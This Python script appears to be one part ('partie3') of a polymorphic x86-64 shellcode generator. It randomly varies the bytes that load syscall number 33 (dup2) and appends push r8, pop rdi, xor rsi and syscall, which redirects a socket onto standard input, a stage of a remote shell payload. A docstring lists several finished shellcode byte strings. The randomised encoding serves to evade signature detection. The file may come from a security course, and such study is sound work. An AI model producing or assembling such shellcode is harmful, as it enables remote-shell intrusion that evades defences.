#!/usr/bin/env python3
import random
from func_instu import *

def partie3():

    x = random.randint(0, 1)

    if x == 0:
        resultat = movxl('al', 33)
    else :
        rdmxor = randomxor('al')
        moval = movxl('al', 33)
        resultat = rdmxor + moval
    
    print(f"OP 3 = {resultat}")

    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    xorrsi = randomxor('rsi') # xor rsi, rsi
    syscall = '\\x0f\\x05' # syscall

    resultat_concat = resultat + pushr8 + poprdi + xorrsi + syscall

    print("Partie 3 = ", resultat_concat)
    print("")

    """
    operande fonctio* : 
    \xfe\xc0\x04\x20\x41\x50\x5f\x48\x31\xf6\x0f\x05
    \x30\xc0\xfe\xc0\x04\x20\x41\x50\x5f\x48\x31\xf6\x0f\x05
    \x30\xc0\x30\xc0\x04\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05
    \xb0\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05
    \x30\xc0\x04\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05
    """

    return resultat_concat